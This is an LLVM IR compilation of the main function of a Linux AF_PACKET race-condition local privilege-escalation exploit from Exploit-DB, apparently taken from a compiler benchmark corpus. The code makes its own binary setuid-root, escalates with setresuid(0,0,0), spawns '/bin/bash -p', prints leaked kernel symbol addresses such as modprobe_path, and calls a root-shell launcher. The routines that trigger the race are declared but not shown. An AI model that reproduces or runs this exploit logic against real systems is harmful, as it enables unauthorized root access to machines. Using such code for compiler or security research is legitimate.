; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.utsname = type { i32 }

@.str = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.4 = private unnamed_addr constant [49 x i8] c"linux AF_PACKET race condition exploit by rebel\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"[.] starting\0A\00", align 1
@.str.6 = private unnamed_addr constant [23 x i8] c"[.] checking hardware\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"[~] done, hardware looks good\0A\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"[.] checking kernel version\0A\00", align 1
@.str.9 = private unnamed_addr constant [30 x i8] c"[~] done, version looks good\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"[.] proc_dostring:         %lx\0A\00", align 1
@PROC_DOSTRING = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [32 x i8] c"[.] modprobe_path:         %lx\0A\00", align 1
@MODPROBE_PATH = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [32 x i8] c"[.] register_sysctl_table: %lx\0A\00", align 1
@REGISTER_SYSCTL_TABLE = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [32 x i8] c"[.] set_memory_rw:         %lx\0A\00", align 1
@SET_MEMORY_RW = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [34 x i8] c"[.] setting up namespace sandbox\0A\00", align 1
@.str.15 = private unnamed_addr constant [36 x i8] c"[~] done, namespace sandbox set up\0A\00", align 1
@KERNEL_BASE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.utsname, align 4
  %9 = alloca [512 x i8], align 16
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i64 (...) @getuid()
  %12 = icmp eq i64 %11, 0
  br i1 %12, label %13, label %20

13:                                               ; preds = %2
  %14 = call i64 (...) @geteuid()
  %15 = icmp eq i64 %14, 0
  br i1 %15, label %16, label %20

16:                                               ; preds = %13
  %17 = call i32 @chown(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i32 0, i32 0)
  %18 = call i32 @chmod(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i32 3565)
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %13, %2
  %21 = call i64 (...) @getuid()
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %31

23:                                               ; preds = %20
  %24 = call i64 (...) @geteuid()
  %25 = icmp eq i64 %24, 0
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = call i32 @setresuid(i32 0, i32 0, i32 0)
  %28 = call i32 @setresgid(i32 0, i32 0, i32 0)
  %29 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* null)
  %30 = call i32 @exit(i32 0) #3
  unreachable

31:                                               ; preds = %23, %20
  %32 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.4, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0))
  %35 = call i32 (...) @check_procs()
  %36 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %38 = call i32 (...) @detect_versions()
  %39 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0))
  %40 = load i32, i32* @PROC_DOSTRING, align 4
  %41 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0), i32 %40)
  %42 = load i32, i32* @MODPROBE_PATH, align 4
  %43 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.11, i64 0, i64 0), i32 %42)
  %44 = load i32, i32* @REGISTER_SYSCTL_TABLE, align 4
  %45 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0), i32 %44)
  %46 = load i32, i32* @SET_MEMORY_RW, align 4
  %47 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.13, i64 0, i64 0), i32 %46)
  %48 = call i32 (...) @fork()
  store i32 %48, i32* %7, align 4
  %49 = load i32, i32* %7, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %57

51:                                               ; preds = %31
  %52 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i64 0, i64 0))
  %53 = call i32 (...) @setup_sandbox()
  %54 = call i32 (i8*, ...) @dprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.15, i64 0, i64 0))
  %55 = call i32 (...) @wrapper()
  %56 = call i32 @exit(i32 0) #3
  unreachable

57:                                               ; preds = %31
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @waitpid(i32 %58, i32* %6, i32 0)
  %60 = call i32 (...) @launch_rootshell()
  ret i32 0
}

declare dso_local i64 @getuid(...) #1

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @dprintf(i8*, ...) #1

declare dso_local i32 @check_procs(...) #1

declare dso_local i32 @detect_versions(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @setup_sandbox(...) #1

declare dso_local i32 @wrapper(...) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i32 @launch_rootshell(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
